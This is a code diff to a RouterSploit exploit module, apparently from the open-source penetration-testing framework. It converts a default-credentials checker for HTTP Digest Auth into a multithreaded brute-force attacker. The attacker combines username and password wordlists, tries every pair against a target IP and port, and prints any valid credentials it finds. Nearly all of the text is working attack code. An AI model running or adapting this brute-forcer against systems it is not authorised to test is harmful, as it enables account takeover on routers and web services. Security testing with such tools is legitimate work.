@@ -1,4 +1,5 @@
 import threading
+import itertools
 
 from routersploit import (
     exploits,
@@ -9,22 +10,21 @@ from routersploit import (
     print_table,
     http_request,
     multi,
+    threads,
     validators,
 )
 
 from routersploit.exceptions import StopThreadPoolExecutor
-from routersploit.threads import ThreadPoolExecutor
 from requests.auth import HTTPDigestAuth
-
 
 class Exploit(exploits.Exploit):
     """
-    Module perform dictionary attack with default credentials against HTTP Digest Auth service.
+    Module performs bruteforce attack against HTTP Digest Auth service.
     If valid credentials are found, they are displayed to the user.
     """
     __info__ = {
-        'name': 'HTTP Digest Default Creds',
-        'description': 'Module perform dictionary attack with default credentials against HTTP Digest Auth service. '
+        'name': 'HTTP Digest Bruteforce',
+        'description': 'Module performs bruteforce attack against HTTP Digest Auth service. '
                        'If valid credentials are found, they are displayed to the user.',
         'authors': [
             'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
@@ -39,13 +39,13 @@ class Exploit(exploits.Exploit):
 
     target = exploits.Option('', 'Target IP address or file with target:port (file://)')
     port = exploits.Option(80, 'Target port')
-    threads = exploits.Option(8, 'Number of threads')
-    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
+
+    threads = exploits.Option(8, 'Numbers of threads')
+    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
+    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
     path = exploits.Option('/', 'URL Path')
     verbosity = exploits.Option(True, 'Display authentication attempts', validators=validators.boolify)
     stop_on_success = exploits.Option(True, 'Stop on first valid authentication attempt', validators=validators.boolify)
-
-    credentials = []
 
     def run(self):
         self.credentials = []
@@ -55,7 +55,7 @@ class Exploit(exploits.Exploit):
     def attack(self):
         url = "{}:{}{}".format(self.target, self.port, self.path)
 
-        response = http_request("GET", url)
+        response = http_request(method="GET", url=url)
         if response is None:
             return
 
@@ -63,15 +63,21 @@ class Exploit(exploits.Exploit):
             print_status("Target is not protected by Basic Auth")
             return
 
-        if self.defaults.startswith('file://'):
-            defaults = open(self.defaults[7:], 'r')
+        if self.usernames.startswith('file://'):
+            usernames = open(self.usernames[7:], 'r')
         else:
-            defaults = [self.defaults]
+            usernames = [self.usernames]
 
-        with ThreadPoolExecutor(self.threads) as executor:
-            for record in defaults:
-                username, password = record.split(':')
-                executor.submit(self.target_function, url, username, password)
+        if self.passwords.startswith('file://'):
+            passwords = open(self.passwords[7:], 'r')
+        else:
+            passwords = [self.passwords]
+
+        collection = itertools.product(usernames, passwords)
+
+        with threads.ThreadPoolExecutor(self.threads) as executor:
+            for record in collection:
+                executor.submit(self.target_function, url, record)
 
         if self.credentials:
             print_success("Credentials found!")
@@ -80,11 +86,9 @@ class Exploit(exploits.Exploit):
         else:
             print_error("Credentials not found")
 
-        defaults.close()
-
-    def target_function(self, url, user, password):
+    def target_function(self, url, creds):
         name = threading.current_thread().name
-
+        user, password = creds
         user = user.encode('utf-8').strip()
         password = password.encode('utf-8').strip()
 
